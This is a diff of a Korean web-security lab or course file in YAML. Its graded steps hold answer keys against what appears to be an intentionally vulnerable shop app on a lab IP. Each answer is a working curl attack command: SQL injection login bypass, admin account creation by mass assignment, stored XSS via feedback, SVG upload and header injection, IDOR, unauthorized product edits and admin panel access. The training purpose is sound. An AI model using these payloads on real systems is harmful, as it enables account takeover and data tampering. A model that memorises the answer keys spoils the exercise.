@@ -17,7 +17,7 @@ steps:
   hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -m json.tool'
+  answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
   answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로 이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
   verify:
     type: output_contains
@@ -29,8 +29,7 @@ steps:
   hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
   category: analysis
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json,base64; t=json.load(sys.stdin)[''authentication''][''token''];
-    p=t.split(''.'')[1]; p+=''=''*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"'
+  answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token']; p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
   answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64 디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
   verify:
     type: output_contains
@@ -54,8 +53,7 @@ steps:
   hint: 등록 요청에 role 필드를 추가하여 전송하라
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Users -H ''Content-Type: application/json'' -d ''{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}''
-    | python3 -m json.tool'
+  answer: "curl -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\":\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
   answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접 지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
   verify:
     type: output_contains
@@ -79,9 +77,8 @@ steps:
   hint: POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3 -m
-    json.tool'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}''
+    | python3 -m json.tool'
   answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
   verify:
     type: output_contains
@@ -105,8 +102,8 @@ steps:
   hint: API 직접 호출로 클라이언트 측 검증을 우회한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero
+    star","rating":0}'' | python3 -m json.tool'
   answer_detail: 클라이언트 측 입력 검증(HTML5 min/max, JavaScript validation)은 API를 직접 호출하면 우회할 수 있다. 서버 측에서도 반드시 검증을 수행해야 한다.
   verify:
     type: output_contains
@@ -118,8 +115,8 @@ steps:
   hint: GET 파라미터로 current, new, repeat을 전달한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'' -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'' -H "Authorization: Bearer $TOKEN" -H ''Cookie:
+    token=''$TOKEN'
   answer_detail: GET 요청으로 비밀번호 변경이 가능하면 CSRF 공격에 매우 취약하다. 공격자가 악성 이미지 태그(<img src=.../change-password?...>)를 삽입하면 피해자의 비밀번호가 자동으로 변경될 수 있다.
   verify:
     type: output_contains
@@ -131,8 +128,7 @@ steps:
   hint: 다른 사용자의 basket ID를 직접 지정하여 접근한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
   answer_detail: IDOR(Insecure Direct Object Reference)는 사용자가 URL의 ID 값을 변경하여 다른 사용자의 리소스에 접근하는 취약점이다. 서버가 요청자의 소유권을 확인하지 않으면 발생한다.
   verify:
     type: output_contains
@@ -144,8 +140,8 @@ steps:
   hint: PUT 요청으로 제품의 description을 변경한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked
+    by attacker"}'' | python3 -m json.tool'
   answer_detail: API 엔드포인트에 대한 HTTP 메서드(PUT, DELETE, PATCH) 접근 제어가 미흡하면 데이터 무결성이 침해된다. 관리자만 수정 가능해야 할 리소스를 일반 사용자가 변경할 수 있는 것은 Broken Access Control이다.
   verify:
     type: output_contains
@@ -157,9 +153,8 @@ steps:
   hint: SVG 파일은 XML 기반이므로 JavaScript를 포함할 수 있다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization:
-    Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file
+    -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
   answer_detail: SVG(Scalable Vector Graphics)는 XML 기반 이미지 포맷으로, onload 이벤트 핸들러에 JavaScript를 포함할 수 있다. 파일 업로드 시 MIME 타입과 확장자 검증만으로는 이러한 공격을 막을 수 없다.
   verify:
     type: output_contains
@@ -171,8 +166,7 @@ steps:
   hint: True-Client-IP 또는 X-Forwarded-For 헤더를 조작한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
   answer_detail: HTTP 헤더 값이 검증 없이 DB에 저장되고 웹 페이지에 렌더링되면 Stored XSS가 발생한다. 클라이언트가 보내는 모든 HTTP 헤더(X-Forwarded-For, True-Client-IP 등)는 신뢰할 수 없는 입력이다.
   verify:
     type: output_contains
@@ -184,8 +178,7 @@ steps:
   hint: 프론트엔드 라우팅만으로 접근을 제한하는 경우 URL 직접 입력으로 우회할 수 있다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN | head -50'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])") && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN | head -50'
   answer_detail: 프론트엔드(Angular/React)에서만 접근을 제한하고 백엔드 API에서 인가 검증을 하지 않으면, URL을 직접 호출하여 관리자 기능에 접근할 수 있다. 서버 측 인가가 필수적이다.
   verify:
     type: output_contains
@@ -197,8 +190,7 @@ steps:
   hint: 각 공격이 해당하는 OWASP 카테고리를 매핑하라
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
-    bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
+  answer: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
     Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
   answer_detail: 공격 결과를 OWASP Top 10 카테고리로 분류하면 체계적인 보고서를 작성할 수 있다. 각 취약점에 대해 위험도(CVSS), 재현 절차, 영향 범위, 권장 대응 방안을 포함하는 것이 전문적인 보고서의 요건이다.
   verify:
